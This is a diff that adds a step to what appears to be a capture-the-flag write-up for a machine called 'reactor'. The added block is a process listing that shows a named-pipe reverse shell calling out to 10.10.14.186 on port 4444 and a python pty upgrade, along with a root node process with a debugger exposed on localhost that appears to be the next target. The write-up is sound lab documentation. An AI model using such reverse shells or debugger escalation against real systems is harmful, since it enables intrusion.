@@ -153,3 +153,15 @@ engineer
 engineer@reactor:~$ cat user.txt
 b74e52abf8ee535c4759b2d7d77d4d5d
 ```
+
+```
+engineer@reactor:~$ ps aux | grep node
+node        1382  0.0  2.6 11808668 104964 ?     Ssl  May23   0:08 next-server (v15.0.3)
+root        1384  0.0  1.2 1067412 48548 ?       Ssl  May23   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+node        2347  0.0  0.0   5828  1880 ?        S    01:23   0:00 cat /tmp/f
+node        2348  0.0  0.0   2800  1804 ?        S    01:23   0:00 sh -i
+node        2349  0.0  0.0   3436  2196 ?        S    01:23   0:00 nc 10.10.14.186 4444
+node        2359  0.0  0.2  18012 10736 ?        S    01:24   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+node        2360  0.0  0.1   8664  5592 pts/0    Ss   01:24   0:00 /bin/bash
+engineer    2463  0.0  0.0   6544  2280 pts/0    S+   01:35   0:00 grep --color=auto node
+```
